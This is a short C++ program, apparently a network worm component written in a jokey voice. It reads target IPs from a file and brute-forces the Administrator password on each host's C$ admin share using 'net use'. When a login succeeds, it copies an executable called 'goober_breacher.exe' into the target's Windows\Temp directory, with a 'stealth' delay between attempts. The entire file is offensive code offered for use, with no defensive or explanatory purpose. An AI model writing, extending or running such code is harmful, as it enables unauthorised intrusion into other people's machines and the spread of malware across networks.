#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h> // For Sleep() and Net commands

// The Goober Brute-Force Generator
void brute_force_node(std::string ip) {
    std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#";
    std::string guess = "aaaa"; // Starting point for v1

    // Simple 4-character brute force loop for v1 logic
    for (char a : chars) {
        for (char b : chars) {
            for (char c : chars) {
                for (char d : chars) {
                    guess = {a, b, c, d};
                    
                    std::cout << "Target [" << ip << "] - Trying: " << guess << " :3" << std::endl;

                    // The Windows command to test the "interconnected" block
                    std::string cmd = "net use \\\\" + ip + "\\C$ " + guess + " /user:Administrator >nul 2>&1";
                    
                    int result = system(cmd.c_str());

                    if (result == 0) { // SUCCESS! WE ARE IN.
                        std::cout << "SUCCESS! OwO - Deploying Breacher to " << ip << std::endl;
                        
                        // Copy the Breacher and Trigger the 1% X3 Roll
                        std::string deploy = "copy goober_breacher.exe \\\\" + ip + "\\C$\\Windows\\Temp\\";
                        system(deploy.c_str());
                        
                        return; // Move to the next IP in the Scout's list
                    }

                    Sleep(5000); // The 5-second Stealth Pause
                }
            }
        }
    }
}

int main() {
    std::ifstream target_file("targets.txt");
    std::string ip;

    while (std::getline(target_file, ip)) {
        brute_force_node(ip);
    }

    return 0;
}

